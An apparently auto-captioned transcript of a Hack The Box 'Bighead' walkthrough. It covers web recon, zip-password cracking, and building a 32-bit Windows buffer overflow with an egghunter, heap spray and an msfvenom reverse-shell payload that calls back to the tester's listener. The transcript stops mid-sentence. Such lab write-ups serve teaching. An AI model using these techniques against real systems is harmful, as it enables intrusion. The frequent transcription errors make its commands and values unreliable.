 what's going on YouTube this is hip sack and we're gonna be doing big head from hack the box which was a really tough box that I wish I had more time to prepare for normally insane boxes it takes me like 10 to 12 hours before the video just to prepare and learn everything this time it is Friday night and I am just beginning on it I have a bunch of notes to go by so it should go half way well but last week I was in the red team training by Specter ops this week I've been dealing with being out of work for a week because I was in training the previous week so my time is a bit sparse right now the box begins with a bunch of recon you find a custom web server called the big head web server you pull the file off of github find out that by sending it a big head request you can do a buffer overflow but there is very small space to work with it is a 32-bit OS so you can do it a kind of relatively easily get a low profile you do a bunch of magic get a high profile and then the root text is within a keep a smile so with all that being said and let's just jump in and hope for the best as always we store up the end map so - Asifa default scripts as via enumerate versions Oh a output all formats but in the end map Direction call it bighead and their IP address which is 10 10 10 1 12 10 take some time to run so I've already ran it look at the results we have just one point open that is HTTP on port 80 and it's running nginx version 1.1 for the title of the page is hyper net comes not really that beneficial to us and unlike most boxes we don't have anything that is leaking like any details about the OS normally it's running like a put the Apache web server and the OS is in the header or it has SSH which is a hen it's Linux or four four five open which is Windows of course but we don't have any of that information so I'm gonna run and map - capital a which is host OS detection and then - P 80 because that's the only port that's open it'll speed it up a little bit and then 1 1 1 2 it is the IP address and while that's running we can also just do it ourselves with ping - c1 10 10 10 1 12 and we see the TTL is 1 27 which is the default for Windows actually the default is 128 but as and that tells us there's one hop between us and 112 and every hop you decrement the TTL by one so that's why we see 127 there if we try to ping ourselves which is a linux box we'll get a TTL of 64 because linux defaults to 64 for the TTL and then most networking equipment defaults to something above 200 so it's a way to identify the OS looking at the results of this and map is guessing it is Windows 7 Vista 2008 Phone 8 1 at 2012 and it's about 91% true so it's telling us essentially what we all already found out through pinging it so let's just move on and check out what the webpage has for us so going to 10 10 10 1 12 we get the piper net webpage so let's just scroll down and see if there's anything interesting we do have some links to like Twitter and Facebook but look at the bottom left when I hover over these links it just has the pound sign so these are no links to know where we have Pied Piper coin comes looks like a blog post we go in it's just an anchor text so there's nothing really interesting there find out more and it's going to a web page the Pied Piper coin HTML and this looks very similar to what we saw before we have a cryptocurrency presentation and let's just keep scrolling down we get a bunch of people so if I was treating this like a web pentest I'd probably open up Cherrytree at this point and then let's make this the right size and go here and then I'm going to press ctrl alt shift and then then down arrow key to send it to a workspace below and that way I don't have to hunt through alt tab to get to my cherry tree I can just hit ctrl alt and then down arrow key so we have the founder and CEO so let's do ctrl n to create a new node call this big head control-shift-n to create a child nude would do people and I guess we'll be fine with this normally I'd spend more time formatting it but it's always handy to get in lists of information on all the people so copy all of this and this could come in handy later on in the box if we ever get like a password or we want to do social engineering and do like a phishing attack once we figure out how their emails are set up we'll be able to create a big email list quickly so that's it for that we also have an email info at Bachman th DB so I'm going to go back to what I can do people and do email addresses and then but info at can I make this bigger there we go bak manatee dot h DB and we also want to put a new child node for a host and we have bak manatee dot h TB which is a an email address we don't have much information about that so let's keep going through the website we see more social media links we don't really have anything we have a contact a team so we just put test test at test calm please subscribe to epic as the contactor team send a message and right off the bat we're getting going to our host mailer big head HD b / send mail dot PHP so i'm going to create a first entry record so V Etsy host and we'll put 10 10 10 112 and we know this box is probably big head HDB mailer dot big head dot h DB and then bak manatee dot h TB normally you wouldn't have to do that step because you have DNS in the real world half the box doesn't do dns so that's why we're doing that we get a big head dot h TB it is that website but let's scroll down and do this mail thing again so test test test send message and it just says message sent so I'm gonna capture this in Burke and just see what it does so go to foxy proxy send it to burp suite and let's go down test test test send message burp suite nothing really too interesting click forward and nothing happens so next thing I want to do while I'm in recon is grab this PDF so let's go back here we'll make artefacts and go in there and do a double you get against it just download it quickly and when that downloads then we can do exist tool against it and examine the metadata because there may be information about user names emails etc within the metadata of this PDF PDF is done so we'll just do exist tool cryptocurrency presentation and we have quite a bit so we have the Creator is adobe illustrator CC 2 2.1 macintosh so i'm going to copy this go back to a cherry tree and then create a new node so is control-shift-n add a child node and we'll do internal infrastructure and was gonna put adobe illustrator CC 2.0 22.1 macintosh and if we ever did a fishing campaign we now know we have to take an account that they may use max anyways let's just go and see what other information we have in this PDF let's see users phone dog so let's copy this internal infrastructure will do people create one that says handles phone dog and put a note that said this came from cryptocurrency PDF and i'm gonna guess just based upon knowing the show this is probably guilfoyle handle because Gilfoyle was the cryptocurrency person let's go up do we have anything else doesn't really look like any other information comes from this so let's just move on go back to the webpage and while this was going on we probably should have been doing go Buster so we'll start go Buster now there always should be some type of recon going on in the background so go Buster - you four URL we can just do big EDH DB word list users share we're list door buster directory list 2.3 medium let that go and since we only have one port open I'm also going to do and map - P - which is all ports and I also want to do a source port of 53 so let's do man and map and search for source port that is going to be - G someone to do and map - G 53 we could also do 80 or 443 let's just do four for three and then - P - all ports Oh a four output all formats plenty and map and we'll call this bighead all ports 10 10 10 1 12 and the reason why I'm specifying a source port is generally firewalls may be miss configured to allow port 443 because usually want to get out to the Internet and if you just allow the TCP port 443 and don't specify ingress or egress then now you may have created a hole back into infrastructure for attackers that use the source port of 443 so that's why I just specified source port when doing it this way and also in Cherrytree i normally be notating like times of when i do things which helps go back and for blue teams when you go and say hey this is what i ran these commands you can go back in your logs and identify if you saw this activity right now i'm just glancing through the PDF to see if there's any user names or anything and it doesn't look like there is a presentation by guilfoyle so guilfoyle is probably fawn dog so let's go back cryptocurrency PDF by guilfoyle so not sure if that will ever play in and for more information check out hemic so that's not guilfoyle so we can ignore that Cora post so since we had one domain and we know another domain which is mailer if we go to mailer we have an error log that reveals bighead htb but nothing else really there so let's do another girl buster scroll up so we can just copy and paste and we'll specify mailer Becca HB as well so let's do mailer bighead HDB and let's actually use out files so mailer bighead go bust and here we probably should've specified an out file as well so I'll redo this well this will be big head dot what I call it was it go bust yeah go bust and nmap doesn't find any other ports so another thing we can do instead of brute force saying pages we can brute force subdomains so we do a double you fuzz - capital H for header and put host : and then fuzz dot big head dot h TB and before I do that lets just tech bak manatee h TB and does this go anywhere we looks like we do go somewhere so we probably got another go Buster think we should be running but where do fuzz bighead HB - w-4 word list user share SEC list then what is a folder discovery DNS and I like the fierce host list dot text and the URL which will be again htb and we want to now do a dash dash H each to hide character count and we'll specify 1 1 1 7 5 and all this is doing is if we go back here let's try to intercept dawn refresh this page send this to repeater so if we get host big-head htb we see 4 4 not found and the target is sending this data to big head h-2b so we can set this target to be the IP address so 10 10 10 1 12 actually an easier way to explain this would just be doing a request for that so you can see what's goes on so 10 10 10 1 12 refresh and we see the host is set to that when we go in repeater we set click go piper net comes and it's going to 10 10 10 1 12 sending this packet so if we change the packet to Bachman DHT be it still goes the Saints place we get a different response this is because of the host header the host header doesn't determine where the packet goes the web server examines this and then decides what page to show based upon the host header so hopefully that makes sense it's virtual host routing but going back to w fuzz which has now finished we have a code domain and a dev domain so let's go back into a host file and do dev dot big head H TB and code big head h TB and we'll also run w fuzz again and instead of big head h TB will do bak mana DHT be looking at go Buster's responses doesn't look like we have many good things this one sends a lot of 302 redirects anything with index it looks like it's sending us somewhere so we can do turn up off and see where it sends us so go to mailer DK h TB slash index and it sends us to a page test link that says an error has occurred so that's what all those three or twos are going so let's check out Jerry again and host now we have bighead h TB dev bighead h TB code and mailer so we have a lot of domains going back and there's probably good frameworks to use to automate doing this like type of recon but showing it manually and then maybe in a future video we'll go over a framework that does a lot of this so where do we want to go next probably check out code big head HT b or dev let's check out code so go back to firefox so let's go up and specify code big head h TB and we get directed to one 27001 port 5080 test link slash login dot PHP so I'm gonna click back in my web browser go over to book let's do options and we'll intercept everything so this is a client request let's do server response click intercept response based upon the following rules and if we don't check anything it'll intercept everything so I don't like doing that because sometimes the content-type header doesn't match text and you want to intercept it so let's go to intercept turn it on go to Firefox go back to code bighead htb and I hit something to go to see net which is odd but going here we can see the request to code click forward we get a 302 found and it's directing us to slash test link / we can follow that redirection now we're getting test link click forward again and it's sending us to one 2700 150 80 let's just change this to code bighead htb and see if this goes anywhere so click forward and now we're getting we screwed something up because we're getting splashed code bighead h2 b / test link / login dot PHP which brings us to a 404 not found so let's try this again so turn intercept on forward through to get here it is so let's just do co dot bighead htb click forward and now we're just getting test link / login dot PHP - go big head up there so this time we didn't put that in the URL click forward again and oh we have to for this response and it looks like we have a lot of information now so click forward turn intercept off because we don't need it anymore and we can see a bunch of error messages so we have C colon backslash X a.m. PP which is I think a web server or something so let's add this into our notes on internal infrastructure and put web server has that let's see test Doc's htdocs third party so this is in the web server which may be helpful when trying to guess where HT HT Doc's directory is so that's why I log that and let's see I can make this a bit bigger bit Nami sounds like a application so save this and let's see no connection could be made to the target active machine I don't think there's anything else in this message that we want to keep so let's just move on and check what our go busters have if we go up still just getting a bunch of indexes I'm just gonna kill this one what a slash teapot here actually 301 redirect slash teapot and that was on code I believe teapot where is this one going to scroll all the way up and this is mailer so if we go to mail a big head HT b / teapot we get an image teapot gif that we can't load let's try a view image maybe if we get rid of mailer and go big head HT b dev HT b and we get a weird gift from google that says 418 I'm a teapot so don't know exactly what that is but we can note it under odd things slash teapot 418 Google gif so let's go back here and see if there's anything else doesn't look like it there we have slash backend so let's check out what back-end is this one is big head HT B so let's do big head HT b / back-end and it just directs us to slash big head and gives an error message so nothing really interesting there let's check out I guess dev big head H TB and we just get a picture of someone so what's view image is there a save image is save image as and let's go route documents crap I hate using the search in Linux let's go back to home let's do htb boxes and then this one is bighead save it on your artifacts and then we'll call this not indexed jpg but dev bighead jpg and let's run exist tool against this just like we did the PDF so go into artifacts exist tool dev and see if we see anything does not look like we have anything of interest here so this is gonna be one of the annoying things about this box that I guess you just have to use different tools sometimes I'm not gonna do go Buster because go Buster's default is to only show these status codes I wish go Buster had a way to like instead of being inclusive be exclusive and say hey I just don't want to see any 404s and then display all other status codes I don't think that's in this version but I can make a request to that cuz then go Buster may be a bit more useful in scenarios like this so to get around that limitation I'm just gonna use W fuzz to brute force the code 1 so w fuzz word list user share word list doorbuster than directory list to 3 medium - use the URL let's do dev big head H TB and that should be good we need to do slash fuzz and this will just put every entry and that word list to the end of the URL and we also now need to do - - h H to hide character count and specify 26 and then I also don't want to see four fours so I'll do - - h C to hide code and we'll let this run so riff the bat we get all these hits which is fine so we got blogs WP content bloggers so while that runs I guess we can check out blog so let's go to dev bighead h-2b slash blog and you can see my VM is now stunning to a bit slow with all this stuff running in the background so going to dev big KH TB we see the page isn't redirecting properly so made the mistake once time Boop sweet back on and intercept exactly what it's doing to see if we can fix that redirection issue so try again we get slash blog it's moving us to have big head H to be slash WP dash content so we're getting that and now it's redirecting us to slash blog so we're getting that and then it's redirecting us to WP content and we can see we are now in a redirect to loop so we can ignore that going back to terminal saying if we see anything else there is coffee and that is giving us an error code of 418 which does match that one gif or one thing we saw earlier so let's Google turn boot sweet off Google HTTP error code 14 to see what this is and the error code is I'm a teapot and it indicates the server refuses to brew coffee because it is a teapot which looks like a joke RFC but let's go and check out what that pages so we go to dev bake at HP / coffee so dev big hairy HDB slash coffee and we get this which is the gift we had saw earlier so we know that is going to be at teapot gif okay bake at HT be coffee we have to go to dev so let's go and look at what this says in burp suite and recept on refresh the page click forward and we see the server is bighead web server version 1.0 so we need to do some research at exactly what this is so let's go over to Google and do bighead web server 1.0 and we get a github repository from emergence which is the Machine creator and we probably should move this internally on the box so we're not depending on github.com hack the box policy has changed it do not allow external resources but it changed I believe after this box so we have 4 commits and it looks like it is just a zip file so let's click this and we have emergence doing all the commits if we go to the latest commit try to download be hws underscore backup zip let's save this and then try to download it so we'll make a directory get and then move downloads it was be HWS backup zip I don't know which one it is so let's just clear my downloads and redownload it may have been artifact from me playing around the box when I did it the first time so let's move downloads bhw zip to a current directory and unzip it and it looks like maybe it's got a password because it doesn't unzip properly if we go into comp we don't see anything need PK compat so let's do was it zip to John on bh WS dot zip and we get the algorithm to try to crack it so let's copy this and go over to my cracking rig which is called the Kraken and then let's do opt John and I'm going to V will do zapped up bighead taste this and do John - - word list equals opt word list rock you dot txt I don't know if it's - - word list I normally don't use John zip big head let's see if it cracks let's see - - format no such file directory it's not pool opt word list rocket zip there we go and let this run and see if it finds anything and I guess while that goes we can also go and browse the commit history and let's go browser repo at this point and see what it is still just a zip file let's go back one more to see if they ever uploaded it without it being a zip and it doesn't look like they have so let's just download the one previous so commits here browse files and we can download this zip and then looks like it completed so we can do John - - show I would specify the hash - - show and it gets the password as the Pied Piper 89 so let's open a new pane going to get and we can do 7z x4 extract be hws backup zip put the password in and it decompresses so we see big head web server he exceed notice there we go so let's just cut that text file and he removed the vulnerable crap where from the archive we go into comp we get a bunch of config stuff so let's try going to that previous file that we had downloaded so we'll rename this to backup - latest - latest and then I'll Ram that old zip and then let's move the zip and downloads and put it here I don't know if that's the same zip let's just again play on my downloads of the zip downloads what's the file name p HW s RM dash RF downloads b HW s star download the slightly older version and then move downloads b HW s backup zip here seven well I'm just checking my clipboard to make sure I have the old password still win it 7z x vh w s backup dot zip put the password and we get wrong password so let's do that zip - John again on this and this is a probably different algorithm because it is much longer than the last one so let's copy this holy cow so copy go over to SSH V was it what we call it before zip big head so let's do this again and then paste and we run the same exact command and it looks like it loaded - and has already cracked so let's do the show and we see the password for this one is just a big head so let's 7z x b h WS backup zip let's delete b h WS backup and put the password of big head and let's go into this and we get two different files we have big head web server Exe and B head server DLL going in the comp we still have the nginx configuration file we could look at it let's do it in VI so it highlights it and we could probably see the virtual host routing so let's see we have a proxy pass so it's taking anything from slash and redirecting it to one 27001 colon 8008 blog this is the redirect loop we had saw slash Pied Piper test link dev back-end slash coffee and slash coffee is redirecting us to one 27001 colon 8008 so this definitely looks like the config file for at least the nginx portion let's grep - v nginx calm grant period oh maybe Brett period nginx comm grab - V yeah I think this will just get rid of all those empty lines what I'm trying to do is find the host name so I can by just search this host server name localhost so this is an engine Xbox and I'm guessing it's probably the config for dev they may have some type of nested thing because I'm used to saying like a host name field here but I'm guessing this is the nginx configuration file for dev dot either dev Baker HP or code Baker HP whichever one has that teapot Deb bake at HP so let us now I guess look at this big head web server dot exe so if we do strings against it what do we see strings big head web server exe oh let's just grab this for password see if there's any hard-coded passwords in it grab it for a pass doesn't look like it let's do the same thing for the DLL strings behead web server DLL grep - I pass and we can also do like encoding - boolean s and L just different ways to find strings but we don't really get anything so it looks like we're gonna have to do some type of reversing on this binary but before I go into reverse I really like to find out more about the OS to find out the exact version so let's go up a few directories and look through what a go Buster's have found so nothing really there less mailer they still running let's go back to SSH it looks like you're go Buster's are still running so I'm gonna pause the video let these go Buster's finish and then we'll take a look at the files they wrote to see if there's any files that will let us to identify exactly what OS it is so then we can begin doing some reverse engineering of that binary so the go Buster's have finished let's look at big head go bust and we can see it just images assets and a bunch of back-end redirects and we know the backend just redirected to slash big head so we don't really care about that let's look at mail a big head go bust and we have a bunch of indexes that redirected so let's do a grep - v2 remove them and we just see slash image and slash teapot neither which are too interesting so let's go and run yet another go bust so do go Buster - w-4 word list and we'll do user share word list - a buster directory list - three let's just do small maybe it'll go a bit quicker - you for your L code bighead h DB and what do - t-54 threads 52 try to speed this up will do - Oh file file code dot go bust run this and see if this gets anything so your domain code big head we found slash dev a bunch of indexes this looks almost identical to how Oh / - born slash male let's try that and whoops identical to how the last one we looked at was let's look at slash dashboard welcome to XA MPP which we had seen we can check slash male and we get Apache 2 4 3 3 open SSL PHP etc which is a bit odd because everything else we've seen is nginx so let's turn rip sweet on and make sure we are intercepting refresh this go to burp suite forward and looking at the server this still says it's nginx but we see an Apache further so we know something odd is going on here so let's go back into our notes go to odd things and we say like the web server probably goes to Apache Rev proxy to a nginx Rev proxy maybe to page and Apache Drive proxies probably running on port 50 80 so now that I'm running down the port you probably got the web server which is nginx on port 80 going to the Apache Rev proxy on port 50 80 so that's probably how that works and then we also had a Jeanette's if we looked at that config that was on let's see let's go back in to get B HWS conf and then less nginx where's there a port 8080 is probably big head so big head web server or eight thousand eight so what kind of a numerating exactly how the web server is configured and now we can go back and look at our go bust results and we still see not what I'd expect so I'm just gonna let this oh wait I see something we do see something here we see PHP myadmin so let's go definitely check that out because we know a lot of ways to execute code with PHP myadmin to an all foxy proxy go to PHP myadmin and looking at the bottom left it is doing a lot of transfers and going back I'm not sure exactly what's going on but something odd is happening I'm going to kill the girl buster in case we're just hammering the server on my network too much to see if we get anything and we just get a blank directory but it's not an error code and we see the PHP myadmin logo in this left of the tab so let's do a another go bust so we'll do go Buster - W user share let's this time do SEC list because we want to find specifically PHP stuff because it's PHP myadmin so discovery web content and let's just go into this directory real quick CD user share cyclist discovery web content OS grab - I PHP we got common PHP file names let's take a look at what this is to see if it has dot PHP on the end of it it does so let's do CD - to go to the previous directory go Buster - W we can copy this and do slash common PHP file names and then - you for your L code big head dot h TB / PHP myadmin and if I don't need to specify threads unable to connect let's see Oh leave this PHP myadmin here and if it helps if I type the host name correctly that's you co dot big head dot h TB okay slash PHP myadmin and now we're finding a bunch of files we have index.php which goes nowhere if we just do index dot PHP nothing happens so let's try the next one down phpinfo dot php' so let's try PHP info dot PHP and finally we get information about this host so we see it is Windows 2008 I 586 so this is a 32-bit build we also see the architecture as 32bit be hp's from 2013 so that is information about the host so let's now go and try to exploit the big head web server and to do that I've already built a Windows 2008 box so let's there we go so now that one Windows 2008 we have to download immunity debugger and we also will have to download Mona I'm normally like using like x64 debug or x32 debug but I have a bunch of trouble getting all that working on Windows 2008 so we're just using what is old because our OS is old and we have immunity downloading so the next thing I want to do is do it omona and download this and this is just a Python kit that makes it a lot easier to do things in both immunity and x64 debug so let's run this close and it's going to install Python now and the reason why I'm not using that like Windows 10 machine that we did commando with is because we want to exploit development to be as close as possible to what a target is so get myrna and if you're curious where I got this copy of Windows from I just googled Windows 2008 evaluation and went to the Microsoft website to download it so now that we have Mona let's go into Program Files immunity debugger PI commands and paste Mona PI so now we have to get the big head web server on this so do that I'm going to go back to or hack the box machine make a directory called SMB go in SMB and then do SMB server which is part of in packet and if you don't have that maybe you have like M - SMB server I think that's how Kelly installs it but you can start it from source you probably have SMB server I will make the share name share and then the directory will just put a working directory and then on our box we can do a CMD net use z : 172 1610 and what is my Callie's IP if config e0 I am 122 and then the directory was share path not found okay you can't have a leading slash with net use so now we have that we can copy big head into this directory so copy get b HW s back up into SMB so that's all we need a counting machine for for a little bit so let's go in Z and copy this to the desktop try to run it and we get an error message so we need Lib min GW e X - 0 DLL so I'm gonna Google man GW 32 windows we'll go to the SourceForge page notice the URL has - w 64 which is 64 bit so I get rid of that and then we'll just download the file so if we go into files it's in mingw then base mingw let's do we have an option between December 6 or July 30th let's just do the latest one may have been smart to do July 30th but I don't know when that box was created I think it was created sometime between July and December that's why I said may have been smart to do that so that box may have 5:01 so just something to keep in mind of so we want the DLL this is Libman gwe X so we can download this and when this finishes we can extract it so let's 7-zip open archive and then we'll copy this binary into the big head web server so now that we have that DLL let's see if it runs or complains about something else nope it is now running so let's find out what port it listens on with a net stat - I think it's ATO and we see let's see 135 we know for 4 or 5 we know these ephemeral ports we probably know 8008 is the weird one that is PID 2640 we do task list and then we can do fine string there's probably a /p ID function actually but fine string should work it does not maybe slash PID 8008 let's do slash question mark let's see is there a way to search by PID task list I'm not sure so let's just look so we wanted something with the two that stands out 26:40 that's what it was so big head web server is listening on port 8080 so let's go back to a cally box and try to curl 172 1610 141 8008 that's not the IP address I pulled the IP from the incoming connection but VMware maybe doing something odd that could be my host IP well let's see we are on a nat address so I'm just going to go into my config and let's set Network into bridge mode so this will take probably 15-20 seconds to get a new IP address see I am 157 do I still have Z let's see if it remounts come on remount Z doesn't look like it's remounting and a lot of things froze exit CMD Z okay remounted Z I am 157 so let's curl that once every 2 16 10 157 eight thousand eight let's see maybe the firewall is it net Sh ATV firewall set all profiles off I have to get the command let's go into the actual firewall and set it manually so properties off off off okay go back to Kali and now we can curl the web server so this part of the video is where I'm going to potentially skip something because I don't want to show fuzzing on 2008 number one because I'm strapped on time right now the box this video goes live in like 12 hours probably maybe less so I don't want to waste a lot of time setting up fuzzing on windows 2008 and then run out of time on the tail end so I'll probably do a separate video on fuzzing and do it again on a modern OS because that'll be more beneficial then something that is already end-of-life so we're just going to assume we know how to exploit the program sorry for the assumption but I'm sure you'll thank me once I put out the fuzzing video so we're just sending a request and sending it 128 days and we get a response back now we're going to change the method to a head request with 128 days and let's see it's not what I wanted to happen we need to put this in single quotes so now I'm going to send it a head request and it still worked let's just do Python - see a times 128 put it in single quotes and I'm forgetting print print a times 128 so let's get rid of - - head and should respond I don't think it should crash yet looks like it crash - even on that let's see let's launch this I thought you had to do a head request bighead web server 8 times 128 far not found so that's what I expected and we look we're getting requests so if I change this to - - head to do a head request sending the Box big head a big head request actually crashes it so let's go see what's happening I'm gonna run the program open up immunity file attached and attach to big head and this fonts probably really small for you so let's do appearance fonts change 11 there we go hopefully that's a bit better so always recommend running the program and then attaching to it because immunity will do some weird things if you don't do that so let's rerun that command that crashed the box and we have e IP is always so now we have to find out where E is so let's do Mona pattern create 128 and we have that but before I do this let's do Mona config set working folder z : backslash and now do this and we go back to a Cali box go into SMB and we can see Mona created the pattern for us and that is not the pattern I wanted I expected to see this and it showed me a bunch of Unicode so let's just copy this message to clipboard go into Z and add it to the pattern I am not sure what it did there so now we can cap pattern we can get this and then we can do that call real quest with that but we have to restart big head before we do that so let's exit out that launched big head web server launch immunity file attached big head run run this command and we can see we crashed at ACC 5 for a a C so now we should be able to do learn a pattern find I think it's ACC 5 for a AC did not find it pattern offset and not sure why it's doing this thought it would have found it let's just find it manually there'll be a fun exercise so let's go into CPU and let's go - I think EAX would be the start of it no let's go to PSP and we [Music] all on stack nope follow and dump I expect to see a lot more ease see if we can find it so let's see let's do shift f7 and see if it goes forward Annie does not we followed this anywhere we can't let's see let's send it a little less a's and see if that helps us I don't think it will but it's always possible we just put in too much and we've smashed it way too hard oh and um yeah so I'm gonna relaunch this and we'll send it a hundred days and see what happens so attach big head go back here get rid of some see paused let's go oh wait I know what happened I always think I was still on a z' it's been a long day and that was probably correct so let's attach again and then go back here we'll send the first request with everything and EIP let's see poured the IP as a CC 5 for AAC so let's go to EAX and let's see where is the start of our payload so we send it a a 0 a so if we go see follow ESP @ 6a let's follow EAX and we have a a 0 a so we look at ESP let's follow this again and go up just a little bit so this is FB 50 which is right here just before FB 50 we have what a IP is a cc right here AC C 5 that's AC c 5 the next thing is gonna be for a then AC so for a AC so we can see that in the memory and that is right at that is 4 8 4 9 4a 4b 4c is when it starts so let's go into calculator switched it to scientific mode if you're not in it already switch to X and we can do 0 1 0 1 FB for C then subtract that from the start of the payload which is going to be e ax so if we'd follow EAX n that's going to be a a 0 a so this will be subtracted by 0 1 0 1 FB - 8 equals 24 then we switch that to decimal which is 36 and keep in mind this is counting bytes it's actually going to be 72 characters because we multiply that by 2 so 72 characters into the payload we get to here so that is how this program calculates where the pattern offset is so let's start here this is where EAX is then you have the probably EBP then ESP up you have a X and then you have a IP right here eb p is probably right here c3 to AAC c1 c3 to AAC yep so 10 we're getting a feel for how the memory is aligned here and then after that there's where ESP starts ESP starts right after AIP so we can start a note file and say e IP overwrite is equal to 72 we have a X space is equal to 72 characters or not 72 it's even less it's probably 68 because EBP takes up some space and then ESP is after let's see Katy probably so let's go to a Python script and start creating this actually before you do that know we can let's do V exploit PI and let's call payload is equal to nothing then actually we call it revs l know we'll call this call it exploit for now we can always rename it so plus equals and we're going to do a times 72 minus 8 and then we'll do exploit plus equals B times 8 and exploit plus equals C times 8 and exploit plus equals D times we'll do a hundred see what this does and we also want to print exploit so we'll copy this go back to a coral command paste and restart Big Ed so that open immunity attached to bighead play throw the payload and it did not work we did not crash it so 100 may be too big so let's do 80 so we shrunk it by 20 characters curl head 172 1610 157 eight thousand eight paste still nothing shrink it by some more and finally we have looks like we crashed it so we can see he is set to all C's EBP is set to all B's and then EDX has some D's in it let's see if we go to ax it's pointing to always so we can see ax 2 eb x which is pointed to right here and we can see the bees there and then es b so let's do mona and let's I guess search for modules and this is going to tell us what compiled protections there are so safe execution handler this is if it crashes and it's false for three things that's bighead web server server DLL and limb men GW we have ASL are disabled for those as well we have DEP disabled for those as well too so everything I do I'm gonna try to ignore this Lib min thing because that's something we downloaded and we don't know what sir what version the server is running so I'm gonna hope to find like a jump ESP or X inside of the big head server DLL or the executable so we'll do Mona jnp - our ESP and if we go back we can find a few esps so we have 0 X 6 2 5 0 1 2 F 0 so if we follow this let's just double click it and I'll fall L so f 0 is jump ESP and F 2 is jump EAX so keep those two in mind we will put it in a notepad so jump ESP is equal to 6 2 5 0 1 2 F 0 and jump ei X is equal to the same thing but F 2 ok so we can put spacing and then what is this eb p is 69 - I think that's 64 this would be 65 this is all wrong math is are doing it live but roughly that's what we want we can get rid of spacing all we need is jump ESB and jump EAX so let's save that to z colon backslash [Music] or ten or a txt and I'm gonna go with a egg hunter on this because when we did the spacing we don't have much space we have like 32 bytes and most Rob change or even gonna be bigger than 32 bytes so we're gonna do an egg hunter which is a small thing and essentially it allows us to put a shell code anywhere so the egg hunter we will I'll type it on our Kelly box is this big font this is so so egg hunter is going to just be shell code that searches for will say injected code and it does that by us tagging it with something so we're gonna put like do a spray and put woot-woot shell code and we're going to do this a bunch of times so when we do that spray then we can say have a shell a hunter say search all memory for woot-woot and then execute what is after it so that's what we're going to do and as long as Depp is disabled this should work pretty easily and on 32-bit it doesn't take too long on 64-bit you have a lot more memory to look at on my cell it becomes an issue but mainly doing it because of the limited amount of space we have so I guess we can start creating the exploit so let's do V exploit PI and we can say cat SMB fortune ar e we want to copy these things paste so let's see we have both of those so we need to create a web request so of course when do import compress and then the our host is going to be 172 1610 157 our port is going to be eight thousand eight and we can make the URL is equal to http plus our host plus pull in our port okay so that should be good next thing we need is the egg hunter so let's go over to our box and we'll do Mona a Connor and it gave us an egg hunter and let's see if it put it in a logical spot put this tag in your shellcode huh doesn't look like it did so maybe putting our working director here didn't help us as much as I thought it would so copy this copy this and then save go back to a box and we can cat a counter text and save this let's go back into our exploit paste a gonner plus equals a Conner plus equals okay the next thing we need is junk so we'll do junk is equal to backslash X 90 which is a naught times 72 divided by 2 because we can do 72 a's and this is two characters and stead of the one so after that we need a shell so we do rev shell actually let's just MSF venom - oh I think and we'll grab four when grep grev let's do L payloads and we get a bunch of them so let's just search for reverse shell find any let's see let's go all the way top tomb MSM atom we can search for shell windows or is it we just search for go to bottom underscore TCP let's see so many things and I hate having the fun a little bit because it spans the lines and now is hard to read Windows shell reverse TCP let's see I want shell underscore reverse TCP shell reverse TCP there we go this is what I want if you do the shell slash that means it's a staged one and this is staged list stage list is a bit bigger but a bit more reliable so let's do MSF venom - P the shell L host is equal to our box so we'll do 172 1610 122 if config 0 yep 122 our port let's say it - 4 4 3 because that's always allowed out of firewalls - format will do Python - Oh she'll PI o we'll call this venom dot pi and I think I mistyped that that's an H not an N and there we go let's just fix that typo the venom dot pi that looks good let's cat lemon pie and then we will send this I think you do - beef variable so it's not buff if you don't want that we can go into exploit paste and we'll put a comment that says MSF venom - P Windows shell reverse TCP hell host that's a dot and before this let's put woot-woot because that's what Mona told us to put and that's the a Connor and that is right here I think I think seven seven is W 30 is zero seven four is T I thought that was it yeah that's it but we got the buff so after that we need to create the payload so payload is equal to junk plus jump ESP and let's put whoops this on top so payload plus jump ESP plus the a connor and we encode that in hex hey Connor junk I think that's good so let's print the payload to make sure it looks fine payload Python exploit PI can't combine string and int where are we doing that probably right here we have to actually have to do like p32 do we have that may have to import a library for that yeah let's just do it manually so this is going to be F 0 1 2 5 0 6 2 and this is going to turn into F 2 1 2 5 0 6 0 okay let's see we got our junk and then I don't remember 6 6 let's do xx put this all as X let's see F 0 that is jump ESP so that looks good and then after 1 2 1 2 1 2 we have the a Connor so that all looks good so the final thing to do is we have to send the payload so the first thing we do is do a spray so this is where we're going to do for I in range will spray it five times now we can you don't have to print it no we can print spraying plus I and then we'll do request post URL data is equal to off and that should be good and then after the spray we want to do print and when python to not place on three so it's a space before print we need tacking and we will do request dot head then URL + / plus payload and it should be good let's do our equals and then print peridot is it text like that will see python exploit pi are we running we are not so let's just start the web server and we won't bother debugging it if we don't crash okay still can't can't combine those two so we'll just do the lazy thing and module has no object port on 49 request URL Yoel wait what that looks fine URL is HTTP colon slash slash / host : our port Oh post spraying spraying spraying attacking doing here we did not crash so what I'm going to do is let's print payload and the payload looks fine so let's set a proxy so to do a proxy I think it's proxy HTTP and then we'll do one 2700 one 8080 and then this request proxies is equal to proxy okay let's make sure I burp is intercepting send it sending the head request click go and we get 404 not found so let's just take off a bunch of this junk because keep in mind everything after the e IP could be considered part of the character space so if we send too much in this header maybe it won't crash so do that and trim down a request click go we're not getting a response we have line breaks at the end if we go to big head a box has crashed and we get to help protect your computer data execution prevention has closed big head web server exe so doesn't look like it worked so the first thing to do is step in and make sure that our exploit went down the intended path so let's do that attach to big head and then let's go into z : where we have the jump is this it that's not it we can just do it again we'll do Mona jump - RESP we want to find where the log messages go to here press f2 to set a breakpoint we'll continue go back to a thing send our payload I just click go and we see breakpoint has hit so let's go find or CPU maximize the window and we can see we landed on jump ESP and if we go to a memory registers and follow this and dump we start at 6 6 8 1 CA and if we go back to our exploit let's V exploit PI C DSMB V exploit PI the egg hunter starts with 6 6 8 1 CA so everything looks good let us disable depth because we should have got a shell actually we weren't listening but because I saw that error message I know we did not so let's do back at LV mp443 reader on the exploit and then we have to remove these headers forward and did we crash we did and we don't ever get a shell so you can just go look nothing so let's disable depth so let's go into control panel I think it's system advanced system settings performance data execution and have depth turned on only for Windows programs essential Windows programs and services so down here it was tunnel in-depth for all program and services except those that are selected and we could have selected it but I'd rather just do this and reboot so let's can we restart it is that disabled and we'll letterbox reboot and try it again so there we are back in our box we can go launch the big head web server go back here run Python exploit our intercept was off so it didn't actually crash it because we're not removing all that junk out of the header probably should just fix the code to not have that but I'm lazy so remove this click forward go to big head we look at task manager or CPU usage was at a hundred percent and that is probably a sign that it's working if we go back to a box and pray we do have a reverse shell so now we have to get it working on the target machine so let's copy exploit to exploit - local and we can do msf venom the El host is now 